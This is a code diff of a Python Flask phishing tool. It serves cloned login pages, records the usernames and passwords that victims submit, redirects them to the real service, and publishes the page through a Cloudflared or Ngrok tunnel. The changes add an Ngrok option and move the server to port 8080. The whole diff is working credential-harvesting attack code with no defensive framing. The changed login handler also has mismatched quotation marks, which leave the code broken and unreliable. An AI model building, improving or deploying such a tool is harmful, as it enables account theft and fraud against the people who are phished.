@@ -3,6 +3,8 @@ from datetime import datetime
 import os
 import subprocess
 import shutil
+import time
+import sys
 
 app = Flask(__name__, template_folder="templates")
 
@@ -26,7 +28,7 @@ def log_credentials(username, password, service):
 def is_termux():
     return "com.termux" in os.environ.get("PREFIX", "")
 
-# Install Cloudflared (for tunneling)
+# Install Cloudflared (if missing)
 def install_cloudflared():
     try:
         if is_termux():
@@ -42,27 +44,28 @@ def install_cloudflared():
         return False
 
 # Start Cloudflared tunnel
-def start_cloudflared(port=80, custom_domain=None):
+def start_cloudflared(port=8080):
     tool_path = shutil.which("cloudflared") or "/usr/local/bin/cloudflared"
     if not tool_path:
-        if input("Install Cloudflared? (y/n): ").lower() == "y":
+        if input("[?] Cloudflared not found. Install it? (y/n): ").lower() == "y":
             if not install_cloudflared():
                 return None
             tool_path = shutil.which("cloudflared") or "/usr/local/bin/cloudflared"
         else:
             return None
 
-    cmd = [tool_path, "tunnel", "--url", f"http://localhost:{port}"]
-    if custom_domain:
-        cmd.extend(["--hostname", custom_domain])
-
     try:
-        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        time.sleep(5)
+        process = subprocess.Popen(
+            [tool_path, "tunnel", "--url", f"http://localhost:{port}"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        time.sleep(5)  # Wait for tunnel to initialize
         for line in process.stderr:
-            if "trycloudflare.com" in line or (custom_domain and custom_domain in line):
+            if "trycloudflare.com" in line:
                 public_url = line.split("|")[-1].strip()
-                print(f"[+] Public URL: {public_url}")
+                print(f"[+] Cloudflared URL: {public_url}")
                 return public_url
         return None
     except Exception as e:
@@ -81,19 +84,9 @@ def setup():
 
     print("\n[+] Select Tunnel:")
     print("1. Cloudflared (Recommended)")
-    print("2. Localhost (No tunnel)")
-    tunnel_choice = input("Enter choice (1/2): ").strip()
-
-    # Start tunnel
-    public_url = None
-    if tunnel_choice == "1":
-        custom_domain = input("Custom domain (leave blank for default): ").strip() or None
-        public_url = start_cloudflared(custom_domain=custom_domain)
-    elif tunnel_choice == "2":
-        print("[+] Running on localhost (no tunnel).")
-    else:
-        print("[!] Invalid choice.")
-        sys.exit(1)
+    print("2. Ngrok")
+    print("3. Localhost (No tunnel)")
+    tunnel_choice = input("Enter choice (1/2/3): ").strip()
 
     # Configure Flask routes
     services = {
@@ -109,20 +102,32 @@ def setup():
 
     @app.route('/login', methods=['POST'])
     def login():
-        username = request.form.get('username') or request.form.get('email')
-        password = request.form.get('password') or request.form.get('pass')
+        username = request.form.get('username') or request.form.get('email")
+        password = request.form.get('password') or request.form.get('pass")
         service = services[choice]["template"].replace('.html', '')
         log_credentials(username, password, service)
         return redirect(services[choice]["redirect"], code=302)
 
-    if public_url:
-        print(f"\n[+] Phishing page active: {public_url}")
-    else:
-        print("\n[+] Phishing page running locally: http://localhost:80")
+    # Start tunnel
+    public_url = None
+    port = 8080  # Avoid port 80 (no root needed)
 
-    app.run(host='0.0.0.0', port=80)
+    if tunnel_choice == "1":
+        public_url = start_cloudflared(port)
+    elif tunnel_choice == "2":
+        print("\n[+] Run Ngrok manually in another terminal:")
+        print(f"    ngrok http {port}")
+        public_url = input("[?] Paste Ngrok URL (e.g., https://abc123.ngrok.io): ").strip()
+    elif tunnel_choice == "3":
+        print(f"\n[+] Local URL: http://localhost:{port}")
+    else:
+        print("[!] Invalid choice.")
+        sys.exit(1)
+
+    # Start Flask
+    print("\n[+] Starting server...")
+    app.run(host='0.0.0.0', port=port)
 
 if __name__ == '__main__':
-    import time
-    import sys
     setup()
+
